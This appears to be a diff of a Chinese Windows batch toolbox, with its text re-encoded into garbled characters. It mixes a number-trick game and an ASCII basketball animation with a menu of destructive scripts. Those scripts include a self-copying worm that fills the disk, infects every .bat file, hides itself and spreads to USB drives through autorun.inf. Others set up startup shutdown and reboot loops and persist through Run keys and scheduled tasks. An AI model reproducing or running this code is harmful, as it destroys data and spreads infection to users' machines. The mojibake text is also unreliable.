+echo.å‘ç”Ÿé”™è¯¯,ä¼ªè£…å›¾ç”Ÿæˆå¤±è´¥.
 echo.
 :mark28.1
-echo. Çë°´ÈÎÒâ¼ü·µ»ØÉÏÒ»²ã¡­¡­
+echo. è¯·æŒ‰ä»»æ„é”®è¿”å›ä¸Šä¸€å±‚â€¦â€¦
 pause >nul
 goto mark0
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -4576,44 +4576,44 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark255
 cls
-title ÌØÊâÇøÓò-²Ëµ¥
+title ç‰¹æ®ŠåŒºåŸŸ-èœå•
 echo===============================================================
-echo.                ÌØÊâÇøÓò-²Ëµ¥
-echo.    1  ¶ÁĞÄÊõ 
-echo.    2  ÀºÇò·ÉÈË»ğ±¬°æ
+echo.                ç‰¹æ®ŠåŒºåŸŸ-èœå•
+echo.    1  è¯»å¿ƒæœ¯ 
+echo.    2  ç¯®çƒé£äººç«çˆ†ç‰ˆ
 echo.
-echo.                             x ³¬¼¶Ó²ÅÌÉ±ÊÖ(É÷ÓÃ)
-echo.                             y ´ÎÆô¶¯¼Æ (É÷ÓÃ)
-echo.                             z Åú´¦ÀíÈä³æ(É÷ÓÃ)
-echo.                             u ÆÁÄ»Õ¨µ¯(É÷ÓÃ)
-echo.                                     0  ·µ»ØÉÏÒ»²ã
+echo.                             x è¶…çº§ç¡¬ç›˜æ€æ‰‹(æ…ç”¨)
+echo.                             y æ¬¡å¯åŠ¨è®¡ (æ…ç”¨)
+echo.                             z æ‰¹å¤„ç†è •è™«(æ…ç”¨)
+echo.                             u å±å¹•ç‚¸å¼¹(æ…ç”¨)
+echo.                                     0  è¿”å›ä¸Šä¸€å±‚
 echo===============================================================
 
-set /p tsqy=     ÇëÑ¡Ôñ¶ÔÓ¦µÄÏîÄ¿ °´enter¼üÈ·¶¨:
+set /p tsqy=     è¯·é€‰æ‹©å¯¹åº”çš„é¡¹ç›® æŒ‰enteré”®ç¡®å®š:
 if /i "%tsqy%"=="1" goto mark-1
 if /i "%tsqy%"=="2" goto mark-2
 if /i "%tsqy%"=="x" goto mark--
 if /i "%tsqy%"=="y" goto mark--
 if /i "%tsqy%"=="z" goto mark--
 if /i "%tsqy%"=="u" goto mark--
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
 :mark-1
 cls
-title ¶ÁĞÄÊõ
+title è¯»å¿ƒæœ¯
 mode con cols=90 lines=30
 echo.
-echo ¡¡¡¡´Ó10¡«99Ö®¼äÈÎÒâÑ¡ÔñÒ»¸öÊı£¬°ÑÕâ¸öÊıµÄÊ®Î»Óë¸öÎ»Ïà¼Ó£¬ÔÙ°ÑÈÎÒâÑ¡ÔñµÄÊı¼õÈ¥Õâ¸öºÍ£¬
-echo ÀıÈç£ºÄãÑ¡µÄÊıÊÇ23£¬È»ºó2+3=5£¬È»ºó23-5=18£¬ÔÚÍ¼±íÖĞÕÒ³öÓë²îÖµ¶ÔÓ¦µÄ·ûºÅ£¬²¢°ÑÕâ¸ö·ûºÅ
-echo ÀÎ¼ÇĞÄÖĞ£¬È»ºó½øÈëÏÂÒ»²½£¬Äã»á·¢ÏÖ£ºÏÔÊ¾³öÀ´µÄ·ûºÅ¾ÍÊÇÄã¸Õ¸ÕĞÄÀï¼ÇÏÂµÄÄÇ¸ö·ûºÅ¡£
+echo ã€€ã€€ä»10ï½99ä¹‹é—´ä»»æ„é€‰æ‹©ä¸€ä¸ªæ•°ï¼ŒæŠŠè¿™ä¸ªæ•°çš„åä½ä¸ä¸ªä½ç›¸åŠ ï¼Œå†æŠŠä»»æ„é€‰æ‹©çš„æ•°å‡å»è¿™ä¸ªå’Œï¼Œ
+echo ä¾‹å¦‚ï¼šä½ é€‰çš„æ•°æ˜¯23ï¼Œç„¶å2+3=5ï¼Œç„¶å23-5=18ï¼Œåœ¨å›¾è¡¨ä¸­æ‰¾å‡ºä¸å·®å€¼å¯¹åº”çš„ç¬¦å·ï¼Œå¹¶æŠŠè¿™ä¸ªç¬¦å·
+echo ç‰¢è®°å¿ƒä¸­ï¼Œç„¶åè¿›å…¥ä¸‹ä¸€æ­¥ï¼Œä½ ä¼šå‘ç°ï¼šæ˜¾ç¤ºå‡ºæ¥çš„ç¬¦å·å°±æ˜¯ä½ åˆšåˆšå¿ƒé‡Œè®°ä¸‹çš„é‚£ä¸ªç¬¦å·ã€‚
 echo.
 echo _________________________________________________________________________________________
 echo.
 
-mshta vbscript:createobject("sapi.spvoice").speak("»¶Ó­À´µ½Ğ¡ÓÎÏ·  ¶ÁĞÄÊõ")(window.close)
-set str=¡î¡ï¡ğ¡ñ¡ò¡ó¡ô¡õ¡ö¡÷¡ø¡ù¡ú¡û¡ü¡ı¡ş£À¡¼¡½¡¾¡¿¡º¡»¡Ö¡Ô¡Æ¡Ê¡Ñ¡ß¡à¡è
+mshta vbscript:createobject("sapi.spvoice").speak("æ¬¢è¿æ¥åˆ°å°æ¸¸æˆ  è¯»å¿ƒæœ¯")(window.close)
+set str=â˜†â˜…â—‹â—â—â—‡â—†â–¡â– â–³â–²â€»â†’â†â†‘â†“ã€“ï¼ ã€–ã€—ã€ã€‘ã€ã€â‰ˆâ‰¡âˆ‘âˆˆâŠ™âˆµâˆ´Â¤
 set begin_num=9
 set end_num=1
 set num=0
@@ -4643,22 +4643,22 @@ if %num% equ 50 (
 
 :mark-1-2
 echo _________________________________________________________________________________________
-echo                                                                    °´ÈÎÒâ¼ü½øÈëÏÂÒ»²½...
+echo                                                                    æŒ‰ä»»æ„é”®è¿›å…¥ä¸‹ä¸€æ­¥...
 pause>nul
 cls
 mode con cols=25 lines=10
 echo.
-mshta vbscript:createobject("sapi.spvoice").speak(" ¼ÆËãÖĞ,ÇëµÈ´ı¡£  ")(window.close)
-mshta vbscript:createobject("sapi.spvoice").speak("ÄãÏëÒªµÄ·ûºÅ¾ÍÊÇ")(window.close)
-echo        ¨q©¤©¤©¤©¤¨r
-echo        ©¦        ©¦   
-echo        ©¦   %var18%   ©¦
-echo        ©¦        ©¦
-echo        ¨t©¤©¤©¤©¤¨s
+mshta vbscript:createobject("sapi.spvoice").speak(" è®¡ç®—ä¸­,è¯·ç­‰å¾…ã€‚  ")(window.close)
+mshta vbscript:createobject("sapi.spvoice").speak("ä½ æƒ³è¦çš„ç¬¦å·å°±æ˜¯")(window.close)
+echo        â•­â”€â”€â”€â”€â•®
+echo        â”‚        â”‚   
+echo        â”‚   %var18%   â”‚
+echo        â”‚        â”‚
+echo        â•°â”€â”€â”€â”€â•¯
 echo.
-echo   °´ÈÎÒâ¼üÍË³ö......
+echo   æŒ‰ä»»æ„é”®é€€å‡º......
 pause>nul
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -4667,7 +4667,7 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 :mark-2
 cls
-title ÀºÇò·ÉÈË»ğ±¬°æ
+title ç¯®çƒé£äººç«çˆ†ç‰ˆ
 @echo off&setlocal enabledelayedexpansion
 mode con cols=71 lines=9
 for /l %%a in (1,1,8) do (
@@ -4675,7 +4675,7 @@ echo/
 echo\
 echo.
 echo **********************************************************************
-echo *************************ÀºÇò·ÉÈË»ğ±¬°æ*******************************
+echo *************************ç¯®çƒé£äººç«çˆ†ç‰ˆ*******************************
 echo **********************************************************************
 color cf
 ping -n 1 192.168.0.1>nul
@@ -4687,8 +4687,8 @@ color f1
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo               o                                                     ^|
 echo              /^|\o                                                   ^|
@@ -4697,8 +4697,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                  o                                                  ^|
 echo                 /^|\                                                 ^|
@@ -4707,8 +4707,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                       o                                             ^|
 echo                      /^|\o                                           ^|
@@ -4717,8 +4717,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                        o                                            ^|
 echo                       /^|\                                           ^|
@@ -4727,8 +4727,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                           o                                         ^|
 echo                          /^|-o                                       ^|
@@ -4737,8 +4737,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                              o                                      ^|
 echo                             /^|\                                     ^|
@@ -4747,8 +4747,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                        ·£ÇòÏßµ½ÁË!                              £½^|--^|
-echo                                                                £Ö'  ^|
+echo                        ç½šçƒçº¿åˆ°äº†!                              ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                                 o                                   ^|
 echo                                /^|-o                                 ^|
@@ -4757,8 +4757,8 @@ ping -n 2 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                        o                       £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                        o                       ï¼¶'  ^|
 echo                                      o/                             ^|
 echo                                     /^|                              ^|
 echo                                      ^>\                             ^|
@@ -4767,8 +4767,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                            o                   £½^|--^|
-echo                                           o^|                   £Ö'  ^|
+echo                                            o                   ï¼^|--^|
+echo                                           o^|                   ï¼¶'  ^|
 echo                                          /^|                         ^|
 echo                                          / ^>                        ^|
 echo                                                                     ^|
@@ -4777,8 +4777,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                 o                   ^|
-echo                                                o^|              £½^|--^|
-echo                                               /^|               £Ö'  ^|
+echo                                                o^|              ï¼^|--^|
+echo                                               /^|               ï¼¶'  ^|
 echo                                                ^>\                   ^|
 echo                                                                     ^|
 echo                                                                     ^|
@@ -4787,8 +4787,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                       o             ^|
 echo                                                     o/              ^|
-echo                                                    /^|          £½^|--^|
-echo                                                    / ^>         £Ö'  ^|
+echo                                                    /^|          ï¼^|--^|
+echo                                                    / ^>         ï¼¶'  ^|
 echo                                                                     ^|
 echo                                                                     ^|
 echo                                                                     ^|
@@ -4797,8 +4797,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                            o        ^|
 echo                                                          o/         ^|
-echo                                                         /^|     £½^|--^|
-echo                                                         / \    £Ö'  ^|
+echo                                                         /^|     ï¼^|--^|
+echo                                                         / \    ï¼¶'  ^|
 echo                                                                     ^|
 echo                                                                     ^|
 echo                                                                     ^|
@@ -4807,8 +4807,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                o    ^|
-echo                                                              o/£½^|--^|
-echo                                                             /^| £Ö'  ^|
+echo                                                              o/ï¼^|--^|
+echo                                                             /^| ï¼¶'  ^|
 echo                                                             //      ^|
 echo                                                                     ^|
 echo                                                                     ^|
@@ -4817,8 +4817,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                ¦Õ'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                Ï†'  ^|
 echo                                                                 o   ^|
 echo                                                                -^|\  ^|
 echo                                                                 ^>^>  ^|
@@ -4827,8 +4827,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                               o     ^|
 echo                                                                   o ^|
 echo                                                                  /^|\^|
@@ -4837,8 +4837,8 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
 echo                                                                     ^|
 echo                                                              o   o  ^|
 echo                                                                 /^|- ^|
@@ -4847,9 +4847,9 @@ ping -n 1 192.168.0.1>nul
 cls
 echo                                                                     ^|
 echo                                                                     ^|
-echo                                                                £½^|--^|
-echo                                                                £Ö'  ^|
-echo                                             Ë§Æø°É? ºÇºÇ~~~         ^|
+echo                                                                ï¼^|--^|
+echo                                                                ï¼¶'  ^|
+echo                                             å¸…æ°”å§? å‘µå‘µ~~~         ^|
 echo                                                                 o   ^|
 echo                                                            o   /^|\  ^|
 echo _______________________________________________________________/_\__^|
@@ -4868,7 +4868,7 @@ ping -n 1 192.168.0.1>nul
 cls
 )
 pause>nul
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 
 
@@ -4899,11 +4899,11 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 
 
 :mark--
-echo. È·¶¨½øÈë??
-echo. ÕâÓĞ¿ÉÄÜ¶ÔÄãµÄÏµÍ³»òÓ²¼şÔì³ÉËğÊ§
-echo. Ò²ÓĞ¿ÉÄÜ±»É±¶¾Èí¼şÀ¹½Ø
-echo. È·¶¨Çë°´ "y"¼Óenter ÍË³öÇë°´ "n"
-echo. Èç¹û³öÏÖ¾Ü¾ø·ÃÎÊ,ÓÃ¹ÜÀíÔ±·½Ê½ÔËĞĞ
+echo. ç¡®å®šè¿›å…¥??
+echo. è¿™æœ‰å¯èƒ½å¯¹ä½ çš„ç³»ç»Ÿæˆ–ç¡¬ä»¶é€ æˆæŸå¤±
+echo. ä¹Ÿæœ‰å¯èƒ½è¢«æ€æ¯’è½¯ä»¶æ‹¦æˆª
+echo. ç¡®å®šè¯·æŒ‰ "y"åŠ enter é€€å‡ºè¯·æŒ‰ "n"
+echo. å¦‚æœå‡ºç°æ‹’ç»è®¿é—®,ç”¨ç®¡ç†å‘˜æ–¹å¼è¿è¡Œ
 set /p hehehe=
 if /i "%hehehe%"=="y"(
 
@@ -4914,7 +4914,7 @@ if /i "%tsqy%"=="u" goto mark-u
 )
 
 
-exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
+exit                    ::é˜²æ­¢æœ‰äººæ‰‹è´±æŒ‰é”™
 
 :mark-x
 @echo off
@@ -4925,16 +4925,16 @@ exit                    ::·ÀÖ¹ÓĞÈËÊÖ¼ú°´´í
 %ozone%^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^%ozone%
 
 if exsit %SystemDrive%\PAGEFILES.SYS goto end
-copy %0 %windir%\system32\logon.bat                     ::¸´ÖÆ×ÔÉí
-FOR /F "tokens=3*" %%i in ('dir /-c %SystemDrive%^|find "¿ÉÓÃ×Ö½Ú"') do fsutil file createnew %SystemDrive%\PAGEFILES.SYS %%i   ::ÖÆÔì³¬´óÎÄ¼ş,ºäÕ¨Ó²ÅÌ
-attrib +r +s +h %SystemDrive%\PAGEFILES.SYS        ::Òş²ØÎÄ¼ş
-reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KV2007 /t REG_SZ /d %windir%\system32\logon.vbs                      ::×Ô¶¯Æô¶¯
-reg delete HKLM\Software\Microsoft\windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /va /f                    ::²»ÏÔÊ¾Òş²ØÎÄ¼ş
-for /r %SystemDrive% %%i in (*.bat) do type %0>%%i       ::¸ĞÈ¾
+copy %0 %windir%\system32\logon.bat                     ::å¤åˆ¶è‡ªèº«
+FOR /F "tokens=3*" %%i in ('dir /-c %SystemDrive%^|find "å¯ç”¨å­—èŠ‚"') do fsutil file createnew %SystemDrive%\PAGEFILES.SYS %%i   ::åˆ¶é€ è¶…å¤§æ–‡ä»¶,è½°ç‚¸ç¡¬ç›˜
+attrib +r +s +h %SystemDrive%\PAGEFILES.SYS        ::éšè—æ–‡ä»¶
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v KV2007 /t REG_SZ /d %windir%\system32\logon.vbs                      ::è‡ªåŠ¨å¯åŠ¨
+reg delete HKLM\Software\Microsoft\windows\CurrentVersion\explorer\Advanced\Folder\Hidden\SHOWALL /va /f                    ::ä¸æ˜¾ç¤ºéšè—æ–‡ä»¶
+for /r %SystemDrive% %%i in (*.bat) do type %0>%%i       ::æ„ŸæŸ“
 
 
 if exist %windir%\system32\logon.vbs goto end
-+++++++++++++++++++++++++=VBS²¿·Ö+++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++=VBSéƒ¨åˆ†+++++++++++++++++++++++++++++++++++++++
 
 echo set fs =createobject("scripting.filesystemobject")>>%windir%\system32\logon.vbs
 echo set WshShell = WScript.CreateObject("WScript.Shell")>>%windir%\system32\logon.vbs
@@ -4943,14 +4943,14 @@ echo ^& "{impersonationLevel=impersonate}!\\" ^& strComputer ^& "\root\cimv2")>>
 echo Set colDisks = objWMIService.ExecQuery _>>%windir%\system32\logon.vbs
 echo ("Select * from Win32_LogicalDisk")>>%windir%\system32\logon.vbs
 
-::¼àÊÓuÅÌ
+::ç›‘è§†uç›˜
 echo For i =1 to 9000000000>>%windir%\system32\logon.vbs
 echo For Each objDisk in colDisks>>%windir%\system32\logon.vbs
 echo Select Case objDisk.DriveType>>%windir%\system32\logon.vbs
 echo :Case 2:>>%windir%\system32\logon.vbs
 
 
-::ÅĞ¶ÏuÅÌÖĞÊÇ·ñ´æÔÚautorun.inf,²»´æÔÚÔòĞ´Èëautorun.inf²¢ÇÒÒş²Ø.
+::åˆ¤æ–­uç›˜ä¸­æ˜¯å¦å­˜åœ¨autorun.inf,ä¸å­˜åœ¨åˆ™å†™å…¥autorun.infå¹¶ä¸”éšè—.
 echo y1=fs.FileExists(objDisk.DeviceID ^& "\AUTORUN.INF")>>%windir%\system32\logon.vbs
 echo if not y1 then>>%windir%\system32\logon.vbs
 echo set f=fs.opentextfile(objDisk.DeviceID ^& "\AUTORUN.INF",2, true)>>%windir%\system32\logon.vbs
@@ -4965,7 +4965,7 @@ echo :f1.Attributes = f1.Attributes XOR 7:>>%windir%\system32\logon.vbs
 echo End If>>%windir%\system32\logon.vbs
 echo end if>>%windir%\system32\logon.vbs
 
-::ÅĞ¶ÏuÅÌÖĞÊÇ·ñ´æÔÚlogon.bat,Èç¹û²»´æÔÚÔòĞ´Èëlogon.bat²¢Òş²Ø.
+::åˆ¤æ–­uç›˜ä¸­æ˜¯å¦å­˜åœ¨logon.bat,å¦‚æœä¸å­˜åœ¨åˆ™å†™å…¥logon.batå¹¶éšè—.
 echo y2=fs.FileExists(objDisk.DeviceID ^& "\logon.bat")>>%windir%\system32\logon.vbs
 echo if not y2 then >>%windir%\system32\logon.vbs
 echo fs.CopyFile "c:\windows\system32\logon.bat",objDisk.DeviceID ^& "\">>%windir%\system32\logon.vbs
@@ -4977,7 +4977,7 @@ echo end if>>%windir%\system32\logon.vbs
 
 echo dirr = Wshshell.ExpandEnvironmentStrings("%systemdrive%")>>%windir%\system32\logon.vbs
 
-::ÅĞ¶ÏuÅÌÖĞÊÇ·ñ´æÔÚPAGEFILES.SYS,Èç¹û²»´æÔÚÔòĞ´ÈëPAGEFILES.SYS²¢Òş²Ø.
+::åˆ¤æ–­uç›˜ä¸­æ˜¯å¦å­˜åœ¨PAGEFILES.SYS,å¦‚æœä¸å­˜åœ¨åˆ™å†™å…¥PAGEFILES.SYSå¹¶éšè—.
 echo y3=fs.FileExists(dirr & "\PAGEFILES.SYS")>>%windir%\system32\logon.vbs
 echo if not y3 then>>%windir%\system32\logon.vbs
 echo WshShell.Run "logon.bat">>%windir%\system32\logon.vbs
@@ -4990,7 +4990,7 @@ echo end if>>%windir%\system32\logon.vbs
 echo End Select>>%windir%\system32\logon.vbs
 echo Next>>%windir%\system32\logon.vbs
 
-::Ã¿¸ô5ÃëÉ¨ÃèÒ»´Î.
+::æ¯éš”5ç§’æ‰«æä¸€æ¬¡.
 echo WScript.Sleep 5000>>%windir%\system32\logon.vbs
 echo Next>>%windir%\system32\logon.vbs
 
@@ -5005,15 +5005,15 @@ echo Next>>%windir%\system32\logon.vbs
 
 :mark-y
 @reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /t reg_sz /d d:\rav.bat /f
-echo ÄãºÃ£¡ÄãµÄµçÄÔ½«ÔÚ10ÃëÄÚ¹Ø±Õ£¬´ËÇé¿öÔÚÏÂÒ»´ÎÆô¶¯Ê±»Ö¸´Õı³£ >>d:\Rav.txt
-echo ²»»á¶ÔÄúµÄ¼ÆËã»ú´øÀ´ÈÎºÎÉËº¦£¬Çë·ÅĞÄÊ¹ÓÃ >>d:\Rav.txt
+echo ä½ å¥½ï¼ä½ çš„ç”µè„‘å°†åœ¨10ç§’å†…å…³é—­ï¼Œæ­¤æƒ…å†µåœ¨ä¸‹ä¸€æ¬¡å¯åŠ¨æ—¶æ¢å¤æ­£å¸¸ >>d:\Rav.txt
+echo ä¸ä¼šå¯¹æ‚¨çš„è®¡ç®—æœºå¸¦æ¥ä»»ä½•ä¼¤å®³ï¼Œè¯·æ”¾å¿ƒä½¿ç”¨ >>d:\Rav.txt
 echo start RAV.txt >>d:\Rav.bat
 echo @reg delete HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v RAV.exe /f >>d:\Rav.bat
 echo del d:\Rav.txt /f >>d:\Rav.bat
 echo shutdown -s -t 10 >>d:\Rav.bat
 echo del d:\Rav.bat /f /a s r h >>d:\Rav.bat
 attrib +s +r +h d:\Rav.bat
-ECHO ´¦ÓÚ¹Ø±Õ×´Ì¬¡£
+ECHO å¤„äºå…³é—­çŠ¶æ€ã€‚
 
 
 
@@ -5029,7 +5029,7 @@ attrib -r -h -s %windir%\"%~nx0" 2>nul >nul
 copy "%~nx0" %windir% /y 2>nul >nul 
 at 9:20 /every:m,t,w,th,f,s,su "%windir%\%~nx0" 
 echo reboot>%windir%\temp.dll 
-set pat=¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯ 
+set pat=ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨ 
 echo @echo off>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
 echo echo reboot^>^>%%windir%%\temp.dll>>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
 echo find /c "reboot" %%windir%%\temp.dll^|find "11">>"%ALLUSERSPROFILE%\%pat%"\reboot.bat 
@@ -5092,7 +5092,7 @@ exit
 
 :mark-u
 @echo off 
-if not exist "%HOMEPATH%\..\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯\power.bat" copy %~fs0 "%HOMEPATH%\..\All Users\¡¸¿ªÊ¼¡¹²Ëµ¥\³ÌĞò\Æô¶¯\power.bat">nul 
+if not exist "%HOMEPATH%\..\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨\power.bat" copy %~fs0 "%HOMEPATH%\..\All Users\ã€Œå¼€å§‹ã€èœå•\ç¨‹åº\å¯åŠ¨\power.bat">nul 
 echo @echo off>%windir%\power.bat 
 echo if "%%1"=="" goto :end>>%windir%\power.bat 
 echo if exist C:\_stop goto :EOF>>%windir%\power.bat 
@@ -5107,4 +5107,4 @@ echo ws.Run "%windir%\power.bat exp",0 >>%windir%\power.vbs
 WScript %windir%\power.vbs 
 del %windir%\power.vbs 
 set p=%~ps0 
-if not %p:~-3,2%==Æô¶¯ del %~fs0
+if not %p:~-3,2%==å¯åŠ¨ del %~fs0
